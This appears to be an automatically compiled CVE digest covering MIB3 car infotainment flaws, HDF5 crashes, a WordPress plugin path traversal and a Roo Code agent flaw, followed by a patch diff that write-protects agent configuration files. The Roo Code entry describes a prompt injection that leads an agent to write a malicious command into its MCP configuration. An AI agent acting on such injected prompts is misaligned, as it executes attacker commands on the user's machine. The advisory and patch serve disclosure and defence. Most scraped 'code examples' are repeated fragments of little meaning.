H5O__chunk_protect

================================================================================


CVE ID: CVE-2023-29113
Published: 2025-06-28T16:15:23.750
Modified: 2025-06-30T18:38:23.493
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:L

CWE Categories:
  - CWE-284: CWE-284

Description:
The MIB3 infotainment unit used in Skoda and Volkswagen vehicles does not incorporate any privilege separation for the proprietary inter-process communication mechanism, leaving attackers with presence in the system an ability to undermine access control restrictions implemented at the operating system level.
The vulnerability was originally discovered in Skoda Superb III car with MIB3 infotainment unit OEM part number 3V0035820. The list of affected MIB3 OEM part numbers is provided in the referenced resources.

References (3):
  1. https://asrg.io/security-advisories/vulnerabilities-in-volkswagen-mib3-infotainment-part-2/
  2. https://i.blackhat.com/EU-24/Presentations/EU-24-Parnishchev-OverTheAirVW.pdf
  3. https://pcacybersecurity.com/resources/advisory/vulnerabilities-in-vw-mib3-infotainment-2

Attempting to extract code examples from references...

--- Code from https://asrg.io/security-advisories/vulnerabilities-in-volkswagen-mib3-infotainment-part-2/ ---
/etc/swup/tnr/tnrref.csv

tsd.media.picserver.mib3.app.target

tag_data_size

================================================================================


CVE ID: CVE-2023-28912
Published: 2025-06-28T16:15:23.583
Modified: 2025-06-30T18:38:23.493
CVSS Score: 5.7 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:A/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N

CWE Categories:
  - CWE-312: Cleartext Storage of Sensitive Information

Description:
The MIB3 unit stores the synchronized phone contact book in clear-text, allowing an attacker with either code execution privilege on the system or physical access to the system to obtain vehicle owner's contact data.
The vulnerability was originally discovered in Skoda Superb III car with MIB3 infotainment unit OEM part number 3V0035820. The list of affected MIB3 OEM part numbers is provided in the referenced resources.

References (3):
  1. https://asrg.io/security-advisories/vulnerabilities-in-volkswagen-mib3-infotainment-part-2/
  2. https://i.blackhat.com/EU-24/Presentations/EU-24-Parnishchev-OverTheAirVW.pdf
  3. https://pcacybersecurity.com/resources/advisory/vulnerabilities-in-vw-mib3-infotainment-2

Attempting to extract code examples from references...

--- Code from https://asrg.io/security-advisories/vulnerabilities-in-volkswagen-mib3-infotainment-part-2/ ---
/etc/swup/tnr/tnrref.csv

tsd.media.picserver.mib3.app.target

tag_data_size

================================================================================


CVE ID: CVE-2023-28911
Published: 2025-06-28T16:15:23.423
Modified: 2025-06-30T18:38:23.493
CVSS Score: 6.5 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H

CWE Categories:
  - CWE-20: Improper Input Validation

Description:
A specific flaw exists within the Bluetooth stack of the MIB3 infotainment. The issue results from the lack of proper validation of user-supplied data, which can result in an arbitrary channel disconnection. An attacker can leverage this vulnerability to cause a denial-of-service attack for every connected client of the infotainment device.
The vulnerability was originally discovered in Skoda Superb III car with MIB3 infotainment unit OEM part number 3V0035820. The list of affected MIB3 OEM part numbers is provided in the referenced resources.

References (3):
  1. https://asrg.io/security-advisories/vulnerabilities-in-volkswagen-mib3-infotainment-part-2/
  2. https://i.blackhat.com/EU-24/Presentations/EU-24-Parnishchev-OverTheAirVW.pdf
  3. https://pcacybersecurity.com/resources/advisory/vulnerabilities-in-vw-mib3-infotainment-2

Attempting to extract code examples from references...

--- Code from https://asrg.io/security-advisories/vulnerabilities-in-volkswagen-mib3-infotainment-part-2/ ---
/etc/swup/tnr/tnrref.csv

tsd.media.picserver.mib3.app.target

tag_data_size

================================================================================


CVE ID: CVE-2023-28910
Published: 2025-06-28T16:15:23.253
Modified: 2025-06-30T18:38:23.493
CVSS Score: 8.0 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:A/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-754: CWE-754

Description:
A specific flaw exists within the Bluetooth stack of the MIB3 infotainment system. The issue results from the disabled abortion flag eventually leading to bypassing assertion functions.
The vulnerability was originally discovered in Skoda Superb III car with MIB3 infotainment unit OEM part number 3V0035820. The list of affected MIB3 OEM part numbers is provided in the referenced resources.

References (3):
  1. https://asrg.io/security-advisories/vulnerabilities-in-volkswagen-mib3-infotainment-part-2/
  2. https://i.blackhat.com/EU-24/Presentations/EU-24-Parnishchev-OverTheAirVW.pdf
  3. https://pcacybersecurity.com/resources/advisory/vulnerabilities-in-vw-mib3-infotainment-2

Attempting to extract code examples from references...

--- Code from https://asrg.io/security-advisories/vulnerabilities-in-volkswagen-mib3-infotainment-part-2/ ---
/etc/swup/tnr/tnrref.csv

tsd.media.picserver.mib3.app.target

tag_data_size

================================================================================


CVE ID: CVE-2023-28909
Published: 2025-06-28T16:15:23.080
Modified: 2025-06-30T20:15:23.697
CVSS Score: 8.0 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:A/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-190: Integer Overflow or Wraparound

Description:
A specific flaw exists within the Bluetooth stack of the MIB3 unit. The issue results from the lack of proper validation of user-supplied data, which can result in an integer overflow when receiving fragmented HCI packets on a channel. An attacker can leverage this vulnerability to bypass the MTU check on a channel with enabled fragmentation. Consequently, this can lead to a buffer overflow in upper layer profiles, which can be used to obtain remote code execution.
The vulnerability was originally discovered in Skoda Superb III car with MIB3 infotainment unit OEM part number 3V0035820. The list of affected MIB3 OEM part numbers is provided in the referenced resources.

References (4):
  1. https://asrg.io/security-advisories/vulnerabilities-in-volkswagen-mib3-infotainment-part-2/
  2. https://i.blackhat.com/EU-24/Presentations/EU-24-Parnishchev-OverTheAirVW.pdf
  3. https://pcacybersecurity.com/resources/advisory/vulnerabilities-in-vw-mib3-infotainment-2
  4. https://i.blackhat.com/EU-24/Presentations/EU-24-Parnishchev-OverTheAirVW.pdf

Attempting to extract code examples from references...

--- Code from https://asrg.io/security-advisories/vulnerabilities-in-volkswagen-mib3-infotainment-part-2/ ---
/etc/swup/tnr/tnrref.csv

tsd.media.picserver.mib3.app.target

tag_data_size

================================================================================


CVE ID: CVE-2023-28908
Published: 2025-06-28T16:15:22.910
Modified: 2025-06-30T20:15:23.580
CVSS Score: 5.4 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L

CWE Categories:
  - CWE-190: Integer Overflow or Wraparound

Description:
A specific flaw exists within the Bluetooth stack of the MIB3 infotainment. The issue results from the lack of proper validation of user-supplied data, which can result in an integer overflow when receiving non-fragmented HCI packets on a channel.
The vulnerability was originally discovered in Skoda Superb III car with MIB3 infotainment unit OEM part number 3V0035820. The list of affected MIB3 OEM part numbers is provided in the referenced resources.

References (4):
  1. https://asrg.io/security-advisories/vulnerabilities-in-volkswagen-mib3-infotainment-part-2/
  2. https://i.blackhat.com/EU-24/Presentations/EU-24-Parnishchev-OverTheAirVW.pdf
  3. https://pcacybersecurity.com/resources/advisory/vulnerabilities-in-vw-mib3-infotainment-2
  4. https://i.blackhat.com/EU-24/Presentations/EU-24-Parnishchev-OverTheAirVW.pdf

Attempting to extract code examples from references...

--- Code from https://asrg.io/security-advisories/vulnerabilities-in-volkswagen-mib3-infotainment-part-2/ ---
/etc/swup/tnr/tnrref.csv

tsd.media.picserver.mib3.app.target

tag_data_size

================================================================================


CVE ID: CVE-2023-28907
Published: 2025-06-28T16:15:22.740
Modified: 2025-06-30T20:15:23.477
CVSS Score: 6.7 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-284: CWE-284

Description:
There is no memory isolation between CPU cores of the MIB3 infotainment. This fact allows an attacker with access to the main operating system to compromise the CPU core responsible for CAN message processing.
The vulnerability was originally discovered in Skoda Superb III car with MIB3 infotainment unit OEM part number 3V0035820. The list of affected MIB3 OEM part numbers is provided in the referenced resources.

References (4):
  1. https://asrg.io/security-advisories/vulnerabilities-in-volkswagen-mib3-infotainment-part-2/
  2. https://i.blackhat.com/EU-24/Presentations/EU-24-Parnishchev-OverTheAirVW.pdf
  3. https://pcacybersecurity.com/resources/advisory/vulnerabilities-in-vw-mib3-infotainment-2
  4. https://i.blackhat.com/EU-24/Presentations/EU-24-Parnishchev-OverTheAirVW.pdf

Attempting to extract code examples from references...

--- Code from https://asrg.io/security-advisories/vulnerabilities-in-volkswagen-mib3-infotainment-part-2/ ---
/etc/swup/tnr/tnrref.csv

tsd.media.picserver.mib3.app.target

tag_data_size

================================================================================


CVE ID: CVE-2023-28906
Published: 2025-06-28T16:15:22.573
Modified: 2025-06-30T20:15:23.370
CVSS Score: 7.8 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')

Description:
A command injection in the networking service of the MIB3 infotainment allows an attacker already presenting in the system to escalate privileges and obtain administrative access to the system.
The vulnerability was originally discovered in Skoda Superb III car with MIB3 infotainment unit OEM part number 3V0035820. The list of affected MIB3 OEM part numbers is provided in the referenced resources.

References (4):
  1. https://asrg.io/security-advisories/vulnerabilities-in-volkswagen-mib3-infotainment-part-2/
  2. https://i.blackhat.com/EU-24/Presentations/EU-24-Parnishchev-OverTheAirVW.pdf
  3. https://pcacybersecurity.com/resources/advisory/vulnerabilities-in-vw-mib3-infotainment-2
  4. https://i.blackhat.com/EU-24/Presentations/EU-24-Parnishchev-OverTheAirVW.pdf

Attempting to extract code examples from references...

--- Code from https://asrg.io/security-advisories/vulnerabilities-in-volkswagen-mib3-infotainment-part-2/ ---
/etc/swup/tnr/tnrref.csv

tsd.media.picserver.mib3.app.target

tag_data_size

================================================================================


CVE ID: CVE-2023-28905
Published: 2025-06-28T16:15:22.410
Modified: 2025-06-30T20:15:23.260
CVSS Score: 8.0 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:A/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-122: CWE-122

Description:
A heap buffer overflow in the image processing binary of the MIB3 infotainment unit allows an attacker to execute arbitrary code on it.
The vulnerability was originally discovered in Skoda Superb III car with MIB3 infotainment unit OEM part number 3V0035820. The list of affected MIB3 OEM part numbers is provided in the referenced resources.

References (4):
  1. https://asrg.io/security-advisories/vulnerabilities-in-volkswagen-mib3-infotainment-part-2/
  2. https://i.blackhat.com/EU-24/Presentations/EU-24-Parnishchev-OverTheAirVW.pdf
  3. https://pcacybersecurity.com/resources/advisory/vulnerabilities-in-vw-mib3-infotainment-2
  4. https://i.blackhat.com/EU-24/Presentations/EU-24-Parnishchev-OverTheAirVW.pdf

Attempting to extract code examples from references...

--- Code from https://asrg.io/security-advisories/vulnerabilities-in-volkswagen-mib3-infotainment-part-2/ ---
/etc/swup/tnr/tnrref.csv

tsd.media.picserver.mib3.app.target

tag_data_size

================================================================================


CVE ID: CVE-2023-28904
Published: 2025-06-28T16:15:22.250
Modified: 2025-06-30T20:15:23.153
CVSS Score: 5.2 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:P/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:N

CWE Categories:
  - CWE-120: Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')

Description:
A logic flaw leading to a RAM buffer overflow in the bootloader component of the MIB3 infotainment unit allows an attacker with physical access to the MIB3 ECU to bypass firmware signature verification and run arbitrary code in the infotainment system at boot process.

References (4):
  1. https://asrg.io/security-advisories/vulnerabilities-in-volkswagen-mib3-infotainment-part-2/
  2. https://i.blackhat.com/EU-24/Presentations/EU-24-Parnishchev-OverTheAirVW.pdf
  3. https://pcacybersecurity.com/resources/advisory/vulnerabilities-in-vw-mib3-infotainment-2
  4. https://i.blackhat.com/EU-24/Presentations/EU-24-Parnishchev-OverTheAirVW.pdf

Attempting to extract code examples from references...

--- Code from https://asrg.io/security-advisories/vulnerabilities-in-volkswagen-mib3-infotainment-part-2/ ---
/etc/swup/tnr/tnrref.csv

tsd.media.picserver.mib3.app.target

tag_data_size

================================================================================


CVE ID: CVE-2023-28903
Published: 2025-06-28T16:15:22.087
Modified: 2025-06-30T20:15:23.040
CVSS Score: 3.3 (LOW) [v3.1]
CVSS Vector: CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:L

CWE Categories:
  - CWE-190: Integer Overflow or Wraparound

Description:
An integer overflow in the image processing binary of the MIB3 infotainment unit allows an attacker with local access to the vehicle to cause a denial-of-service of the infotainment system.

References (4):
  1. https://asrg.io/security-advisories/vulnerabilities-in-volkswagen-mib3-infotainment-part-2/
  2. https://i.blackhat.com/EU-24/Presentations/EU-24-Parnishchev-OverTheAirVW.pdf
  3. https://pcacybersecurity.com/resources/advisory/vulnerabilities-in-vw-mib3-infotainment-2
  4. https://i.blackhat.com/EU-24/Presentations/EU-24-Parnishchev-OverTheAirVW.pdf

Attempting to extract code examples from references...

--- Code from https://asrg.io/security-advisories/vulnerabilities-in-volkswagen-mib3-infotainment-part-2/ ---
/etc/swup/tnr/tnrref.csv

tsd.media.picserver.mib3.app.target

tag_data_size

================================================================================


CVE ID: CVE-2023-28902
Published: 2025-06-28T16:15:21.160
Modified: 2025-06-30T20:15:22.727
CVSS Score: 3.3 (LOW) [v3.1]
CVSS Vector: CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:L

CWE Categories:
  - CWE-191: CWE-191

Description:
An integer underflow in the image processing binary of the MIB3 infotainment unit allows an attacker with local access to the vehicle to cause denial-of-service of the infotainment system.
The vulnerability was originally discovered in Skoda Superb III car with MIB3 infotainment unit OEM part number 3V0035820. The list of affected MIB3 OEM part numbers is provided in the referenced resources.

References (4):
  1. https://asrg.io/security-advisories/vulnerabilities-in-volkswagen-mib3-infotainment-part-2/
  2. https://i.blackhat.com/EU-24/Presentations/EU-24-Parnishchev-OverTheAirVW.pdf
  3. https://pcacybersecurity.com/resources/advisory/vulnerabilities-in-vw-mib3-infotainment-2
  4. https://i.blackhat.com/EU-24/Presentations/EU-24-Parnishchev-OverTheAirVW.pdf

Attempting to extract code examples from references...

--- Code from https://asrg.io/security-advisories/vulnerabilities-in-volkswagen-mib3-infotainment-part-2/ ---
/etc/swup/tnr/tnrref.csv

tsd.media.picserver.mib3.app.target

tag_data_size

================================================================================


CVE ID: CVE-2025-6817
Published: 2025-06-28T12:15:20.790
Modified: 2025-07-01T17:30:53.610
CVSS Score: 3.3 (LOW) [v3.1]
CVSS Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L

CWE Categories:
  - CWE-400: Uncontrolled Resource Consumption
  - CWE-404: CWE-404

Description:
A vulnerability, which was classified as problematic, has been found in HDF5 1.14.6. This issue affects the function H5C__load_entry of the file /src/H5Centry.c. The manipulation leads to resource consumption. The attack needs to be approached locally. The exploit has been disclosed to the public and may be used.

References (6):
  1. https://github.com/HDFGroup/hdf5/issues/5572 [Exploit, Issue Tracking]
  2. https://github.com/user-attachments/files/20623368/hdf5_crash_4.txt [Exploit]
  3. https://vuldb.com/?ctiid.314255 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.314255 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.602294 [Third Party Advisory, VDB Entry]
  6. https://github.com/HDFGroup/hdf5/issues/5572 [Exploit, Issue Tracking]

Attempting to extract code examples from references...

--- Code from https://github.com/HDFGroup/hdf5/issues/5572 ---
H5C__load_entry

src/H5Centry.c:1018:37

H5C__load_entry

================================================================================


CVE ID: CVE-2025-6816
Published: 2025-06-28T08:15:25.343
Modified: 2025-07-01T17:32:51.163
CVSS Score: 3.3 (LOW) [v3.1]
CVSS Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L

CWE Categories:
  - CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer
  - CWE-122: CWE-122

Description:
A vulnerability classified as problematic was found in HDF5 1.14.6. This vulnerability affects the function H5O__fsinfo_encode of the file /src/H5Ofsinfo.c. The manipulation leads to heap-based buffer overflow. It is possible to launch the attack on the local host. The exploit has been disclosed to the public and may be used.

References (6):
  1. https://github.com/HDFGroup/hdf5/issues/5571 [Exploit, Issue Tracking]
  2. https://github.com/user-attachments/files/20623354/hdf5_crash_3.txt [Exploit]
  3. https://vuldb.com/?ctiid.314254 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.314254 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.602291 [Third Party Advisory, VDB Entry]
  6. https://github.com/HDFGroup/hdf5/issues/5571 [Exploit, Issue Tracking]

Attempting to extract code examples from references...

--- Code from https://github.com/HDFGroup/hdf5/issues/5571 ---
H5O__fsinfo_encode

src/H5Ofsinfo.c:243:5

H5O__fsinfo_encode

================================================================================


CVE ID: CVE-2025-6381
Published: 2025-06-28T04:15:46.110
Modified: 2025-07-07T15:24:28.070
CVSS Score: 8.8 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-36: CWE-36

Description:
The BeeTeam368 Extensions plugin for WordPress is vulnerable to Directory Traversal in all versions up to, and including, 2.3.4 via the handle_remove_temp_file() function. This makes it possible for authenticated attackers, with Subscriber-level access and above, to perform actions on files outside of the originally intended directory. This vulnerability can be used to delete the wp-config.php file, which can be leveraged into a site takeover.

References (2):
  1. https://themeforest.net/item/vidmov-video-wordpress-theme/35542187 [Product, Release Notes]
  2. https://www.wordfence.com/threat-intel/vulnerabilities/id/aed40456-43c3-4647-9bce-e7c6139c84cd?source=cve [Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://themeforest.net/item/vidmov-video-wordpress-theme/35542187 ---

Version 2.3.6 (07/10/2025)
        - Change the default option to check file validity on upload to: "YES" 



Version 2.3.5 (06/24/2025)
        - Fixed: Improper Limitation of a Pathname to a Restricted Directory ( handle_live_fn function )
        - Fixed: Absolute Path Traversal ( handle_remove_temp_file function )
        - Improved: WPStream API



Version 2.3.3 (06/15/2025)
        - New: Social Network Links for Members ( Update on profile management page )
        - Fixed: Local File Inclusion ( beeteam368_get_elements_block function )
        - Fixed: Local File Inclusion ( beeteam368_loadmore_posts function )
        - Fixed: HTML structure error in author element ( bp_activity_at_name_filter function )


================================================================================


CVE ID: CVE-2025-6379
Published: 2025-06-28T04:15:45.700
Modified: 2025-07-07T15:24:31.510
CVSS Score: 8.8 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

Description:
The BeeTeam368 Extensions Pro plugin for WordPress is vulnerable to Directory Traversal in all versions up to, and including, 2.3.4 via the handle_live_fn() function. This makes it possible for authenticated attackers, with Subscriber-level access and above, to perform actions on files outside of the originally intended directory. This vulnerability can be used to delete the wp-config.php file, which can be leveraged into a site takeover.

References (2):
  1. https://themeforest.net/item/vidmov-video-wordpress-theme/35542187 [Product, Release Notes]
  2. https://www.wordfence.com/threat-intel/vulnerabilities/id/26abf509-f0a9-4849-9028-d6c42832158f?source=cve [Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://themeforest.net/item/vidmov-video-wordpress-theme/35542187 ---

Version 2.3.6 (07/10/2025)
        - Change the default option to check file validity on upload to: "YES" 



Version 2.3.5 (06/24/2025)
        - Fixed: Improper Limitation of a Pathname to a Restricted Directory ( handle_live_fn function )
        - Fixed: Absolute Path Traversal ( handle_remove_temp_file function )
        - Improved: WPStream API



Version 2.3.3 (06/15/2025)
        - New: Social Network Links for Members ( Update on profile management page )
        - Fixed: Local File Inclusion ( beeteam368_get_elements_block function )
        - Fixed: Local File Inclusion ( beeteam368_loadmore_posts function )
        - Fixed: HTML structure error in author element ( bp_activity_at_name_filter function )


================================================================================


CVE ID: CVE-2025-53098
Published: 2025-06-27T22:15:25.993
Modified: 2025-09-15T18:08:32.237
CVSS Score: 8.1 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')

Description:
Roo Code is an AI-powered autonomous coding agent. The project-specific MCP configuration for the Roo Code agent is stored in the `.roo/mcp.json` file within the VS Code workspace. Because the MCP configuration format allows for execution of arbitrary commands, prior to version 3.20.3, it would have been possible for an attacker with access to craft a prompt to ask the agent to write a malicious command to the MCP configuration file. If the user had opted-in to auto-approving file writes within the project, this would have led to arbitrary command execution. This issue is of moderate severity, since it requires the attacker to already be able to submit prompts to the agent (for instance through a prompt injection attack), for the user to have MCP enabled (on by default), and for the user to have enabled auto-approved file writes (off by default). Version 3.20.3 fixes the issue by adding an additional layer of opt-in configuration for auto-approving writing to Roo's configuration files, including all files within the `.roo/` folder.

References (2):
  1. https://github.com/RooCodeInc/Roo-Code/commit/7d0b22f9e659dc6c26aab0bacbea27874986e772 [Patch]
  2. https://github.com/RooCodeInc/Roo-Code/security/advisories/GHSA-5x8h-m52g-5v54 [Vendor Advisory]

Attempting to extract code examples from references...

--- Code from https://github.com/RooCodeInc/Roo-Code/commit/7d0b22f9e659dc6c26aab0bacbea27874986e772 ---
From 7d0b22f9e659dc6c26aab0bacbea27874986e772 Mon Sep 17 00:00:00 2001
From: Matt Rubens <mrubens@users.noreply.github.com>
Date: Fri, 13 Jun 2025 19:58:55 -0400
Subject: [PATCH] Add logic to prevent auto-approving edits of configuration
 files (#4667)

* Add logic to prevent auto-approving edits of configuration files

* Fix tests

* Update patterns
---
 packages/types/src/global-settings.ts         |   2 +
 packages/types/src/message.ts                 |   1 +
 .../presentAssistantMessage.ts                |   9 +-
 src/core/prompts/responses.ts                 |  10 +-
 src/core/protect/RooProtectedController.ts    | 103 +++++++++++++
 .../__tests__/RooProtectedController.spec.ts  | 141 ++++++++++++++++++
 src/core/task/Task.ts                         |  12 +-
 src/core/tools/insertContentTool.ts           |   6 +-
 src/core/tools/listFilesTool.ts               |   1 +
 src/core/tools/multiApplyDiffTool.ts          |  18 ++-
 src/core/tools/searchAndReplaceTool.ts        |  11 +-
 src/core/tools/writeToFileTool.ts             |   6 +-
 src/core/webview/ClineProvider.ts             |   3 +
 src/core/webview/webviewMessageHandler.ts     |   4 +
 src/shared/ExtensionMessage.ts                |   2 +
 src/shared/WebviewMessage.ts                  |   1 +
 src/shared/tools.ts                           |   1 +
 webview-ui/src/components/chat/ChatRow.tsx    |  74 ++++++---
 webview-ui/src/components/chat/ChatView.tsx   |   9 +-
 .../settings/AutoApproveSettings.tsx          |  18 ++-
 .../src/components/settings/SettingsView.tsx  |   3 +
 webview-ui/src/i18n/locales/ca/chat.json      |   1 +
 webview-ui/src/i18n/locales/ca/settings.json  |   4 +
 webview-ui/src/i18n/locales/de/chat.json      |   1 +
 webview-ui/src/i18n/locales/de/settings.json  |   4 +
 webview-ui/src/i18n/locales/en/chat.json      |   1 +
 webview-ui/src/i18n/locales/en/settings.json  |   4 +
 webview-ui/src/i18n/locales/es/chat.json      |   1 +
 webview-ui/src/i18n/locales/es/settings.json  |   4 +
 webview-ui/src/i18n/locales/fr/chat.json      |   1 +
 webview-ui/src/i18n/locales/fr/settings.json  |   4 +
 webview-ui/src/i18n/locales/hi/chat.json      |   1 +
 webview-ui/src/i18n/locales/hi/settings.json  |   4 +
 webview-ui/src/i18n/locales/it/chat.json      |   1 +
 webview-ui/src/i18n/locales/it/settings.json  |   4 +
 webview-ui/src/i18n/locales/ja/chat.json      |   1 +
 webview-ui/src/i18n/locales/ja/settings.json  |   4 +
 webview-ui/src/i18n/locales/ko/chat.json      |   1 +
 webview-ui/src/i18n/locales/ko/settings.json  |   4 +
 webview-ui/src/i18n/locales/nl/chat.json      |   1 +
 webview-ui/src/i18n/locales/nl/settings.json  |   4 +
 webview-ui/src/i18n/locales/pl/chat.json      |   1 +
 webview-ui/src/i18n/locales/pl/settings.json  |   4 +
 webview-ui/src/i18n/locales/pt-BR/chat.json   |   1 +
 .../src/i18n/locales/pt-BR/settings.json      |   4 +
 webview-ui/src/i18n/locales/ru/chat.json      |   1 +
 webview-ui/src/i18n/locales/ru/settings.json  |   4 +
 webview-ui/src/i18n/locales/tr/chat.json      |   1 +
 webview-ui/src/i18n/locales/tr/settings.json  |   4 +
 webview-ui/src/i18n/locales/vi/chat.json      |   1 +
 webview-ui/src/i18n/locales/vi/settings.json  |   4 +
 webview-ui/src/i18n/locales/zh-CN/chat.json   |   1 +
 .../src/i18n/locales/zh-CN/settings.json      |   4 +
 webview-ui/src/i18n/locales/zh-TW/chat.json   |   1 +
 .../src/i18n/locales/zh-TW/settings.json      |   4 +
 55 files changed, 488 insertions(+), 32 deletions(-)
 create mode 100644 src/core/protect/RooProtectedController.ts
 create mode 100644 src/core/protect/__tests__/RooProtectedController.spec.ts

diff --git a/packages/types/src/global-settings.ts b/packages/types/src/global-settings.ts
index 253f98fa4999..5b729a125fbf 100644
--- a/packages/types/src/global-settings.ts
+++ b/packages/types/src/global-settings.ts
@@ -36,6 +36,7 @@ export const globalSettingsSchema = z.object({
 	alwaysAllowReadOnlyOutsideWorkspace: z.boolean().optional(),
 	alwaysAllowWrite: z.boolean().optional(),
 	alwaysAllowWriteOutsideWorkspace: z.boolean().optional(),
+	alwaysAllowWriteProtected: z.boolean().optional(),
 	writeDelayMs: z.number().optional(),
 	alwaysAllowBrowser: z.boolean().optional(),
 	alwaysApproveResubmit: z.boolean().optional(),
@@ -177,6 +178,7 @@ export const EVALS_SETTINGS: RooCodeSettings = {
 	alwaysAllowReadOnlyOutsideWorkspace: false,
 	alwaysAllowWrite: true,
 	alwaysAllowWriteOutsideWorkspace: false,
+	alwaysAllowWriteProtected: false,
 	writeDelayMs: 1000,
 	alwaysAllowBrowser: true,
 	alwaysApproveResubmit: true,
diff --git a/packages/types/src/message.ts b/packages/types/src/message.ts
index aebd1fe3ae77..914f02ecd669 100644
--- a/packages/types/src/message.ts
+++ b/packages/types/src/message.ts
@@ -153,6 +153,7 @@ export const clineMessageSchema = z.object({
 	checkpoint: z.record(z.string(), z.unknown()).optional(),
 	progressStatus: toolProgressStatusSchema.optional(),
 	contextCondense: contextCondenseSchema.optional(),
+	isProtected: z.boolean().optional(),
 })
 
 export type ClineMessage = z.infer<typeof clineMessageSchema>
diff --git a/src/core/assistant-message/presentAssistantMessage.ts b/src/core/assistant-message/presentAssistantMessage.ts
index 54916cf89ff9..21c973ab5076 100644
--- a/src/core/assistant-message/presentAssistantMessage.ts
+++ b/src/core/assistant-message/presentAssistantMessage.ts
@@ -261,8 +261,15 @@ export async function presentAssistantMessage(cline: Task) {
 				type: ClineAsk,
 				partialMessage?: string,
 				progressStatus?: ToolProgressStatus,
+				isProtected?: boolean,
 			) => {
-				const { response, text, images } = await cline.ask(type, partialMessage, false, progressStatus)
+				const { response, text, images } = await cline.ask(
+					type,
+					partialMessage,
+					false,
+					progressStatus,
+					isProtected || false,
+				)
 
 				if (response !== "yesButtonClicked") {
 					// Handle both messageResponse and noButtonClicked with text.
diff --git a/src/core/prompts/responses.ts b/src/core/prompts/responses.ts
index dc6e08c8a07a..3f38789fdc92 100644
--- a/src/core/prompts/responses.ts
+++ b/src/core/prompts/responses.ts
@@ -2,6 +2,7 @@ import { Anthropic } from "@anthropic-ai/sdk"
 import * as path from "path"
 import * as diff from "diff"
 import { RooIgnoreController, LOCK_TEXT_SYMBOL } from "../ignore/RooIgnoreController"
+import { RooProtectedController } from "../protect/RooProtectedController"
 
 export const formatResponse = {
 	toolDenied: () => `The user denied this operation.`,
@@ -95,6 +96,7 @@ Otherwise, if you have not completed the task and do not need additional informa
 		didHitLimit: boolean,
 		rooIgnoreController: RooIgnoreController | undefined,
 		showRooIgnoredFiles: boolean,
+		rooProtectedController?: RooProtectedController,
 	): string => {
 		const sorted = files
 			.map((file) => {
@@ -143,7 +145,13 @@ Otherwise, if you have not completed the task and do not need additional informa
 					// Otherwise, mark it with a lock symbol
 					rooIgnoreParsed.push(LOCK_TEXT_SYMBOL + " " + filePath)
 				} else {
-					rooIgnoreParsed.push(filePath)
+					// Check if file is write-protected (only for non-ignored files)
+					const isWriteProtected = rooProtectedController?.isWriteProtected(absoluteFilePath) || false
+					if (isWriteProtected) {
+						rooIgnoreParsed.push("🛡️ " + filePath)
+					} else {
+						rooIgnoreParsed.push(filePath)
+					}
 				}
 			}
 		}
diff --git a/src/core/protect/RooProtectedController.ts b/src/core/protect/RooProtectedController.ts
new file mode 100644
index 000000000000..b74b6a9bb96b
--- /dev/null
+++ b/src/core/protect/RooProtectedController.ts
@@ -0,0 +1,103 @@
+import path from "path"
+import ignore, { Ignore } from "ignore"
+
+export const SHIELD_SYMBOL = "\u{1F6E1}"
+
+/**
+ * Controls write access to Roo configuration files by enforcing protection patterns.
+ * Prevents auto-approved modifications to sensitive Roo configuration files.
+ */
+export class RooProtectedController {
+	private cwd: string
+	private ignoreInstance: Ignore
+
+	// Predefined list of protected Roo configuration patterns
+	private static readonly PROTECTED_PATTERNS = [
+		".rooignore",
+		".roomodes",
+		".roorules*",
+		".clinerules*",
+		".roo/**",
+		".rooprotected", // For future use
+	]
+
+	constructor(cwd: string) {
+		this.cwd = cwd
+		// Initialize ignore instance with protected patterns
+		this.ignoreInstance = ignore()
+		this.ignoreInstance.add(RooProtectedController.PROTECTED_PATTERNS)
+	}
+
+	/**
+	 * Check if a file is write-protected
+	 * @param filePath - Path to check (relative to cwd)
+	 * @returns true if file is write-protected, false otherwise
+	 */
